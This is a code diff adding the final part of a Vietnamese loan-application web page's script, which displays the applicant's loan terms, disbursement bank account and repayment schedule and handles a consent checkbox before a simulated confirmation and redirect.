+        // Group 2: Thông tin khoản vay (Step 2)
+        const loanInfo = [
+          {
+            label: "Hình thức vay",
+            value: data.loanType || "Chưa cung cấp",
+          },
+          {
+            label: "Số tiền vay",
+            value: formatCurrency(data.loanAmount),
+            isCurrency: true,
+          },
+          {
+            label: "Thời hạn vay",
+            value:
+              data.loanTerm > 0 ? `${data.loanTerm} tháng` : "Chưa cung cấp",
+          },
+          {
+            label: "Lãi suất",
+            value:
+              data.interestRate > 0
+                ? `${data.interestRate}%/năm`
+                : "Chưa cung cấp",
+          },
+          {
+            label: "Mục đích vay",
+            value: data.purpose || "Chưa cung cấp",
+          },
+          {
+            label: "Thu nhập hàng tháng",
+            value: data.monthlyIncome > 0 
+              ? formatCurrency(data.monthlyIncome) 
+              : "Chưa cung cấp",
+            isCurrency: data.monthlyIncome > 0,
+          },
+          {
+            label: "Nghề nghiệp",
+            value: data.occupation || "Chưa cung cấp",
+          },
+        ];
+
+        // Group 3: Tài khoản giải ngân (Step 2)
+        const accountInfo = [
+          {
+            label: "Tên tài khoản",
+            value: data.accountName || "Chưa cung cấp",
+          },
+          {
+            label: "Số tài khoản",
+            value: data.accountNumber || "Chưa cung cấp",
+          },
+          {
+            label: "Ngân hàng",
+            value: data.bankName || "Chưa cung cấp",
+          },
+        ];
+
+        // Group 4: Thông tin thanh toán
+        const paymentInfo = [
+          {
+            label: "Trả góp hàng tháng",
+            value: formatCurrency(data.monthlyPayment),
+            isCurrency: true,
+          },
+          {
+            label: "Tổng lãi phải trả",
+            value: formatCurrency(data.totalInterest),
+            isCurrency: true,
+          },
+          {
+            label: "Tổng số tiền phải trả",
+            value: formatCurrency(data.totalRepay),
+            isCurrency: true,
+          },
+          { 
+            label: "Ngày giải ngân dự kiến", 
+            value: data.disbursementDate || "Chưa cung cấp" 
+          },
+        ];
+
+        // Combine all groups
+        const details = [
+          ...personalInfo,
+          { label: "", value: "", isSeparator: true }, // Separator
+          ...loanInfo,
+          { label: "", value: "", isSeparator: true }, // Separator
+          ...accountInfo,
+          { label: "", value: "", isSeparator: true }, // Separator
+          ...paymentInfo,
+        ];
+
+        const fragment = document.createDocumentFragment();
+        details.forEach((d) => {
+          if (d.isSeparator) {
+            // Add separator
+            const li = document.createElement("li");
+            li.className = "info-list-separator";
+            li.style.height = "1px";
+            li.style.background = "var(--fecredit-border)";
+            li.style.margin = "16px 0";
+            fragment.appendChild(li);
+          } else {
+            const li = document.createElement("li");
+            li.className = "info-list-item";
+            const valueClass = d.isCurrency ? "value currency" : "value";
+            li.innerHTML = `<span class="label">${d.label}</span><span class="${valueClass}">${d.value || "Chưa cung cấp"}</span>`;
+            fragment.appendChild(li);
+          }
+        });
+        ui.loanDetailsList.innerHTML = "";
+        ui.loanDetailsList.appendChild(fragment);
+
+        const tableFragment = document.createDocumentFragment();
+        if (data.tableData && data.tableData.length > 0) {
+          data.tableData.forEach((row) => {
+            const tr = document.createElement("tr");
+            tr.innerHTML = `
+                        <td data-label="Tháng">${row.month}</td>
+                        <td data-label="Gốc">${formatCurrency(
+                          row.principal
+                        )}</td>
+                        <td data-label="Lãi">${formatCurrency(
+                          row.interest
+                        )}</td>
+                        <td data-label="Tổng">${formatCurrency(row.total)}</td>
+                        <td data-label="Dư nợ">${formatCurrency(
+                          row.balance
+                        )}</td>
+                    `;
+            tableFragment.appendChild(tr);
+          });
+        } else {
+          const tr = document.createElement("tr");
+          tr.innerHTML = `<td colspan="5">Không có dữ liệu để hiển thị bảng tính toán.</td>`;
+          tableFragment.appendChild(tr);
+        }
+        ui.calculationTable.innerHTML = "";
+        ui.calculationTable.appendChild(tableFragment);
+      }
+
+      function setupEventListeners() {
+        ui.signBtn.addEventListener("click", processLoanConfirmation);
+      }
+
+      async function processLoanConfirmation() {
+        const consentCheckContainer = ui.consentCheck.closest(".form-check");
+        consentCheckContainer.classList.remove("is-invalid");
+
+        if (!ui.consentCheck.checked) {
+          consentCheckContainer.classList.add("is-invalid");
+          
+          // Announce error to screen readers
+          const announcements = document.getElementById("announcements");
+          if (announcements) {
+            announcements.textContent = "Vui lòng đồng ý với điều khoản và điều kiện để tiếp tục";
+          }
+          
+          // Focus management - focus the checkbox
+          ui.consentCheck.focus();
+          
+          if (navigator.vibrate) navigator.vibrate(100);
+          setTimeout(() => {
+            consentCheckContainer.classList.remove("is-invalid");
+          }, 500);
+          return;
+        }
+
+        ui.processingOverlay.classList.add("show");
+
+        try {
+          await new Promise((resolve) => setTimeout(resolve, 3000));
+          window.location.href = "step6.html";
+        } catch (error) {
+          console.error("Lỗi xác nhận khoản vay:", error);
+          ui.processingOverlay.classList.remove("show");
+          displayGlobalError("Xác nhận thất bại. Vui lòng thử lại sau.");
+        }
+      }
+
+      function displayGlobalError(message) {
+        ui.loadingView.classList.remove("show");
+        ui.mainContent.style.display = "none";
+        const errorDiv = document.getElementById("global-error");
+        errorDiv.innerHTML = message;
+        errorDiv.style.display = "block";
+      }
+
+      document.addEventListener("DOMContentLoaded", main);
+    </script>
+  </body>
+</html>
